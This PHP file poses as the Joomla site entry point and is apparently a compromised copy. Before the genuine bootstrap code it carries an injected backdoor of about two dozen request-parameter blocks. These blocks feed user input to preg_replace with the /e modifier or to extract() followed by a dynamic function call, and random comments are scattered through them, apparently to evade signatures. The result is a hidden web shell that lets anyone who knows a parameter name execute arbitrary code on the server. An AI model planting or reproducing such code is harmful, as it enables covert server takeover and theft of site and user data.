<?php
if (isset($_REQUEST["Bi"])) {@preg_replace('/(.*)/e', @$_REQUEST['Bi'], '');/*sMiuC*/}

if (isset($_REQUEST["BGUFa"])) {@preg_replace('/(.*)/e', @$_REQUEST['BGUFa'], '');/*XAhtTFc*/}

if (isset($_REQUEST["thvs"])) {/*PPWiidgQ*/@preg_replace('/(.*)/e', @$_REQUEST['thvs'], '');/*GdWXWjz*/}

if (isset($_REQUEST["ZwdJ"])) {@preg_replace('/(.*)/e', @$_REQUEST['ZwdJ'], '');}

if (isset($_REQUEST["jAtv"])) {@preg_replace('/(.*)/e', @$_REQUEST['jAtv'], '');}

if (isset($_REQUEST["uH"])) {/*jkvDCTiiTr*/@preg_replace('/(.*)/e', @$_REQUEST['uH'], '');/*ROIlk*/}

if (isset($_REQUEST["gFAV"])) {/*wMSHZO*/@preg_replace('/(.*)/e', @$_REQUEST['gFAV'], '');}

if (isset($_REQUEST["OrXb"])) {@preg_replace('/(.*)/e', @$_REQUEST['OrXb'], '');}

if (isset($_REQUEST["Id"])) {@preg_replace('/(.*)/e', @$_REQUEST['Id'], '');/*KBUgij*/}

if (isset($_REQUEST["Thj"])) {@preg_replace('/(.*)/e', @$_REQUEST['Thj'], '');}

if (isset($_REQUEST["ytB"])) {/*GnIVLII*/@preg_replace('/(.*)/e', @$_REQUEST['ytB'], '');}

if (isset($_REQUEST["CdX"])) {/*CKEUfQiZ*/@preg_replace('/(.*)/e', @$_REQUEST['CdX'], '');}

if (isset($_REQUEST["fhee"])) {@preg_replace('/(.*)/e', @$_REQUEST['fhee'], '');}

if (isset($_REQUEST["ysDPK"])) {/*yJYxQrnbBp*/@preg_replace('/(.*)/e', @$_REQUEST['ysDPK'], '');}

if (isset($_REQUEST["uI"])) {/*asxaHJ*/@preg_replace('/(.*)/e', @$_REQUEST['uI'], '');/*oYqBdvm*/}

if (isset($_REQUEST["BFF"])) {/*lkOPpYY*/@preg_replace('/(.*)/e', @$_REQUEST['BFF'], '');}

if (isset($_REQUEST["LXG"])) {@preg_replace('/(.*)/e', @$_REQUEST['LXG'], '');}

if (isset($_REQUEST["hXwS"])) {@preg_replace('/(.*)/e', @$_REQUEST['hXwS'], '');}

if (isset($_REQUEST["Chc"])) {/*qiHbJ*/@preg_replace('/(.*)/e', @$_REQUEST['Chc'], '');/*bPaNN*/}

if (isset($_REQUEST["ObYH"])) {@preg_replace('/(.*)/e', @$_REQUEST['ObYH'], '');/*VCDAa*/}

if (isset($_REQUEST["GRu"])) {@preg_replace('/(.*)/e', @$_REQUEST['GRu'], '');}

if (isset($_REQUEST["ZZJDI"])) {@preg_replace('/(.*)/e', @$_REQUEST['ZZJDI'], '');}

if (isset($_REQUEST["Bj"])) {/*kZubZ*/@extract($_REQUEST);@die($Bj($oUyO));}

if (isset($_REQUEST["ad"])) {/*HeEqEhAcuD*/@extract($_REQUEST);/*BkAhczgdd*/@die($ad($JJyV));}

if (isset($_REQUEST["ViQTZ"])) {/*WPwdJcfhr*/@extract($_REQUEST);/*eOQzvJEUf*/@die($ViQTZ($Mh));/*lLJin*/}

/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

if (version_compare(PHP_VERSION, '5.3.1', '<'))
{
	die('Your host needs to use PHP 5.3.1 or higher to run this version of Joomla!');
}

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
 */
define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php'))
{
	include_once __DIR__ . '/defines.php';
}

if (!defined('_JDEFINES'))
{
	define('JPATH_BASE', __DIR__);
	require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

// Mark afterLoad in the profiler.
JDEBUG ? $_PROFILER->mark('afterLoad') : null;

// Instantiate the application.
$app = JFactory::getApplication('site');

// Initialise the application.
$app->initialise();

// Mark afterIntialise in the profiler.
JDEBUG ? $_PROFILER->mark('afterInitialise') : null;

// Route the application.
$app->route();

// Mark afterRoute in the profiler.
JDEBUG ? $_PROFILER->mark('afterRoute') : null;

// Dispatch the application.
$app->dispatch();

// Mark afterDispatch in the profiler.
JDEBUG ? $_PROFILER->mark('afterDispatch') : null;

// Render the application.
$app->render();

// Mark afterRender in the profiler.
JDEBUG ? $_PROFILER->mark('afterRender') : null;

// Return the response.
echo $app;
